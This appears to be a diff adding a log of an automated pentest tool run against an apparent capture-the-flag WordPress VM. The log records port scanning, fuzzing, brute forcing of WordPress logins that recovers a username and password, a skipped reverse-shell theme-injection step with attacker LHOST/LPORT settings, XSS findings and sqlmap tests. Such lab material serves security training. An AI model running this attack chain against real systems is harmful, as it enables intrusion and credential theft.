@@ -1,0 +1,119 @@
+$ python3 /pentool/pentool-v0.065.py 10.49.162.208 --ui cli --authorized --workspace /runs --run-id e0f7528074 --pn --staged --scan-mode pentest --preset pro-fast --searchsploit --nuclei --enum4linux --ffuf --no-nikto --web-early --no-web-early --web-crawl --sqlmap --xss --max-web-urls 2 --max-gobuster 1 --gobuster-threads 15 --lhost 172.20.10.2 --lport 4444 --archive-crack --wp-brute --wp-aggressive --wp-exploit
+# started: 2026-06-15 07:11:59
+
+
+ ██████╗ ███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗
+ ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║
+ ██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║
+ ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║
+ ██║     ███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝███████╗
+ ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+
+pentool v0.66 — Recon/Enum automation (detection-only)
+
+Outils présents: nmap, whatweb, nikto, gobuster, ffuf, searchsploit, nuclei, enum4linux-ng
+  Wordlist: common.txt (37 Ko)
+Wordlist custom : /usr/share/seclists/Discovery/Web-Content/common.txt (37 Ko)
+LHOST `172.20.10.2` vérifié et sauvegardé.
+Target: 10.49.162.208
+Run dir: /runs/10.49.162.208/e0f7528074
+Preset: pro-fast | Staged Nmap: True | scan-mode: pentest
+Étape 1/4 — Nmap ports discovery (pentest, staged)
+OK  [nmap ports] (2.3s) -> /runs/10.49.162.208/e0f7528074/logs/nmap_ports_cmd.txt
+Ports ouverts détectés: 22,80,443
+Étape 2/4 — Nmap enum ciblée (ports ouverts)
+OK  [nmap enum] (9.1s) -> /runs/10.49.162.208/e0f7528074/logs/nmap_enum_cmd.txt
+Nmap enum sans résultat (ports filtrés/ralentis) — fallback sur ports discovery
+22/tcp ssh   
+80/tcp http   
+443/tcp https   
+Étape 3b/4 — Searchsploit (références Exploit-DB via --nmap)
+OK  [searchsploit] (0.0s) -> /runs/10.49.162.208/e0f7528074/logs/searchsploit_cmd.txt
+enum4linux-ng: aucun service SMB détecté -> SKIP
+URLs détectées: http://10.49.162.208, https://10.49.162.208
+Étape 4/4 — Enum web automatique (parallèle)
+nikto désactivé (--no-nikto)
+ffuf activé (remplace gobuster)
+OK  [whatweb https://10.49.162.208] (17.0s) -> /runs/10.49.162.208/e0f7528074/logs/whatweb_https___10.49.162.208.txt
+OK  [whatweb http://10.49.162.208] (17.0s) -> /runs/10.49.162.208/e0f7528074/logs/whatweb_http___10.49.162.208.txt
+OK  [ffuf https://10.49.162.208] (695.2s) -> /runs/10.49.162.208/e0f7528074/logs/ffuf_https___10.49.162.208.txt
+OK  [ffuf http://10.49.162.208] (695.5s) -> /runs/10.49.162.208/e0f7528074/logs/ffuf_http___10.49.162.208.txt
+[ffuf followup] Exploration de 66 résultat(s) ffuf
+[+] [ffuf followup] Téléchargement: http://10.49.162.208/admin/ → admin
+[+] [ffuf followup] Téléchargement: http://10.49.162.208/robots.txt → robots.txt
+[+] [ffuf followup] Téléchargement: http://10.49.162.208/sitemap.xml → sitemap.xml
+[+] [ffuf followup] Téléchargement: http://10.49.162.208/wp-admin/ → wp-admin
+[+] [ffuf followup] Téléchargement: http://10.49.162.208/wp-config → wp-config
+[ffuf followup] 5 finding(s) — voir /runs/10.49.162.208/e0f7528074/logs/ffuf_followup.txt
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/0/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/Image/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/admin/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/feed/atom/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/image/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/index.html
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/intro
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/license
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-login.php
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/readme
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/feed/rdf/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/robots
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/robots.txt
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/feed/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/sitemap
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/sitemap.xml
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-admin/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-content/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-config
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-cron
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-load
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-links-opml
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-login
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.49.162.208/wp-login.php?action=register
+[robots] Analyse robots.txt + sitemap.xml
+[+] [robots] http://10.49.162.208/robots.txt (41 octets)
+  → [robots] Entrée non-standard: http://10.49.162.208/fsocity.dic
+[+] [robots] Fichier téléchargé: http://10.49.162.208/fsocity.dic → fsocity.dic (7245381 octets)
+  → [robots] Entrée non-standard: http://10.49.162.208/key-1-of-3.txt
+[+] [robots] Fichier téléchargé: http://10.49.162.208/key-1-of-3.txt → key-1-of-3.txt (33 octets)
+[+] [robots] http://10.49.162.208/admin/robots.txt (43 octets)
+[+] [robots] http://10.49.162.208/wp-links-opml/sitemap.xml (227 octets)
+[+] [robots] http://10.49.162.208/wp-links-opml/sitemap_index.xml (227 octets)
+[+] [robots] http://10.49.162.208/wp-login/sitemap.xml (2671 octets)
+[+] [robots] http://10.49.162.208/wp-login/sitemap_index.xml (2671 octets)
+[robots] 2 chemin(s) extrait(s) → ajoutés au pipeline
+[JS scraper] Analyse des fichiers JavaScript
+[+] [JS scraper] Password trouvé: password: ",delay:500},{clear:!0,type:"
+[+] [JS scraper] Password trouvé: password: ",delay:500},{clear:!0,type:"
+[JS scraper] 11 fichier(s) JS analysé(s)
+[.git] Vérification exposition dépôt Git
+[.git] Aucun dépôt exposé trouvé
+[WPRecon] WordPress détecté → http://10.49.162.208
+[WPRecon] Lancement wpscan (mode: aggressive)...
+[WPRecon] wpscan timeout (5 min)
+[WPRecon] Test XML-RPC → http://10.49.162.208/xmlrpc.php
+[WPRecon] XML-RPC ACTIVÉ — endpoint accessible
+[WPRecon] Terminé — XML-RPC activé
+[WPScan] WordPress brute force → http://10.49.162.208
+[WPScan] Wordlist: /runs/10.49.162.208/e0f7528074/logs/robots_downloads/fsocity.dic (7075 Ko)
+[WPScan] Wordlist volumineux → déduplication...
+[WPScan] Dédup: 11451 mots uniques → dedup_fsocity.dic
+[WPScan] Phase 1 — Enumération des utilisateurs via wpscan...
+[WPScan] Aucun user trouvé via --enumerate u — tentative avec wordlist comme usernames...
+[WPScan] Enum fallback: 11451 mots → wp-login.php (arrêt au 1er username valide)
+[+] [WPScan] Username valide: Elliot
+[WPScan] Phase 2 — Brute force passwords (['Elliot'])...
+[+] [WPScan] CREDENTIAL TROUVÉ: Elliot:ER28-0652
+[WebUI] En attente de confirmation : WordPress — Theme File Injection (Reverse Shell)
+[WebUI] Timeout (300s) sans réponse → SKIP : WordPress — Theme File Injection (Reverse Shell)
+[WP Exploit] Refusé ou timeout — skipping
+Web crawl — exploration de 18 pages cibles (max 20)
+[+] Web crawl : 2 formulaire(s), 1 param(s), 3 endpoint(s) (20 pages visitées)
+XSS scan — test des formulaires et paramètres URL
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.49.162.208/wp-login.php?action=register → param: action
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.49.162.208/wp-login.php?action=lostpassword → param: action
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.49.162.208/wp-login.php → param: log (POST)
+[+] XSS trouvée! [Reflected XSS] http://10.49.162.208/wp-login.php?action=lostpassword → param: user_login (POST)
+SQLmap — test de 4 cible(s) (SQLi automatique)
+TIMEOUT [sqlmap[0]] (180.0s) -> /runs/10.49.162.208/e0f7528074/logs/sqlmap/sqlmap_0.txt
+TIMEOUT [sqlmap[1]] (180.0s) -> /runs/10.49.162.208/e0f7528074/logs/sqlmap/sqlmap_1.txt
